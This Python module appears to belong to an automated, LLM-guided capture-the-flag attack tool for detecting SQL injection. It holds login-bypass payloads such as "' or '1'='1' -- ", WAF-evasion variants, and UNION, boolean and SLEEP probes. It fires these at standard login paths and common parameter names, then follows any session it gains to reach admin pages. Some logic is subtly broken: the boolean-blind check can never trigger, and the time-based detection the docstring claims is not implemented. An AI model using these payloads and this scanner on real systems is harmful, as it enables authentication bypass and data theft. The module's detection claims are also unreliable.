"""SQL 注入检测：登录绕过 + 参数注入（布尔/报错/时间盲注/UNION 探测）。

LLM 提示支持（ctx 字段）：
  extra_form_paths  : LLM 发现的非标准登录路径
  param_hints       : LLM 推荐优先测试的参数名
  waf_hint          : WAF/过滤特征描述 → 自动切换 WAF 绕过 payload
"""
from __future__ import annotations

from ..common import (Candidate, body_of, extract_flag, extract_session,
                      follow_session, get, post)

# 标准登录注入载荷
LOGIN_PAYLOADS = [
    ("' or '1'='1' -- ", "x"),
    ("' or '1'='1'#", "x"),
    ("admin' -- ", "x"),
    ("1' or '1'='1' -- ", "1"),
]

# WAF 绕过载荷：当 ctx["waf_hint"] 非空时优先使用
# 双引号注入（绕过单引号过滤）、注释绕过、十六进制
WAF_BYPASS_PAYLOADS = [
    ('" or "1"="1" -- ', "x"),
    ('a" or "b"="b', "x"),
    ('1/**/or/**/1=1', "x"),
    ('1 OR 1=1', "x"),
    ('1%20OR%201=1', "x"),
]

PARAM_PAIRS = [
    ("1", "1'"),
    ("1", "1' AND '1'='1"),
    ("1", "1 OR 1=1"),
    ("1", "1' OR '1'='1"),
    ("1", "1 UNION SELECT 1,2,3"),
    ("1", '1" OR "1"="1'),
    ("1", "1' AND SLEEP(2) -- "),
]

PARAM_NAMES = ["id", "uid", "user_id", "order", "type", "cat", "cid", "pid",
               "page", "limit", "goods_id", "article_id", "file_id", "sid"]


def _ordered_unique(items: list[str]) -> list[str]:
    return list(dict.fromkeys(items))


def run(ctx) -> list[Candidate]:
    out: list[Candidate] = []
    base = ctx["base"].rstrip("/")
    out += _login_bypass(ctx, base)

    # LLM 推荐参数优先，其次是内置参数名
    param_hints = ctx.get("param_hints", [])
    all_params = _ordered_unique(param_hints + PARAM_NAMES)

    for path in ("/", "/api", "/api/v1", "/list", "/index"):
        if ctx["time_left"]() <= 0:
            break
        for pname in all_params:
            if ctx["time_left"]() <= 0:
                break
            cand = _probe_param(ctx, base, path, pname)
            if cand:
                out.append(cand)
                break
    return out


def _login_bypass(ctx, base: str) -> list[Candidate]:
    # LLM 发现的非标准登录路径优先
    extra = ctx.get("extra_form_paths", [])
    std_paths = ["/login", "/api/login", "/auth/login", "/user/login", "/signin"]
    all_form_paths = _ordered_unique(extra + std_paths)

    # 根据 WAF 提示选择载荷集
    use_waf_bypass = bool(ctx.get("waf_hint"))
    payloads = (WAF_BYPASS_PAYLOADS + LOGIN_PAYLOADS) if use_waf_bypass else LOGIN_PAYLOADS

    out: list[Candidate] = []
    for form_path in all_form_paths:
        if ctx["time_left"]() <= 0:
            break
        resp = post(base + form_path, ctx["timeout"],
                    data={"user": "u", "pass": "p"})
        if resp is None or resp.status_code not in (200, 401, 302, 403):
            continue

        # 检测 WAF（即使 ctx 里没设置，自动识别并切换）
        local_payloads = payloads
        if resp.status_code == 403 and "waf" in body_of(resp).lower():
            local_payloads = WAF_BYPASS_PAYLOADS + LOGIN_PAYLOADS

        for user, pwd in local_payloads:
            r = post(base + form_path, ctx["timeout"],
                     data={"user": user, "pass": pwd})
            if r is None:
                continue
            body = body_of(r)
            flag = extract_flag(body)
            if flag or (r.status_code in (200, 302) and resp.status_code in (401, 403)):
                note = f"注入载荷 {user!r} 使 {resp.status_code}→{r.status_code}"
                session = extract_session(body)
                if session:
                    followed = follow_session(base, session, ctx["timeout"])
                    if followed:
                        url2, body2, note2 = followed
                        flag = flag or extract_flag(body2)
                        return [Candidate(
                            type="sqli", url=f"{base}{form_path} → {url2}",
                            request=f"POST {form_path} user={user!r} + session-follow",
                            response=(flag or body2)[:300],
                            impact="SQL 注入登录绕过 → 会话 → 管理页数据泄露",
                            confidence=0.95 if flag else 0.8,
                            value=flag,
                            confirm={"note": f"{note}; {note2}"},
                        )]
                return [Candidate(
                    type="sqli", url=base + form_path,
                    request=f"POST {form_path} user={user!r}",
                    response=(flag or body)[:300],
                    impact="SQL 注入登录绕过（认证规避）",
                    confidence=0.9 if flag else 0.75,
                    value=flag,
                    confirm={"note": note},
                )]
    return out


def _probe_param(ctx, base: str, path: str, pname: str) -> Candidate | None:
    r0 = get(base + path, ctx["timeout"], params={pname: "1"})
    if r0 is None:
        return None
    b0 = body_of(r0)
    for probe, payload in PARAM_PAIRS:
        if ctx["time_left"]() <= 0:
            return None
        r = get(base + path, ctx["timeout"], params={pname: payload})
        if r is None:
            continue
        body = body_of(r)
        flag = extract_flag(body)
        if flag:
            return Candidate(
                type="sqli", url=f"{base}{path}?{pname}={payload}",
                request=f"GET {path}?{pname}={probe!r}",
                response=body[:300],
                impact=f"SQL 注入 {pname} 参数获取 flag",
                confidence=0.95, value=flag,
                confirm={"note": "注入载荷直接命中 flag"},
            )
        if probe == "1' AND '1'='1" and body == b0:
            r_false = get(base + path, ctx["timeout"], params={pname: "1' AND '1'='2"})
            if r_false is not None and body_of(r_false) != body and body != "":
                return Candidate(
                    type="sqli", url=f"{base}{path}?{pname}={payload}",
                    request=f"GET {path}?{pname}=1",
                    response=body[:300],
                    impact=f"布尔盲注 {pname} 参数（恒真/恒假响应差异）",
                    confidence=0.8,
                    confirm={"note": "恒真与恒假响应存在差异"},
                )
    return None

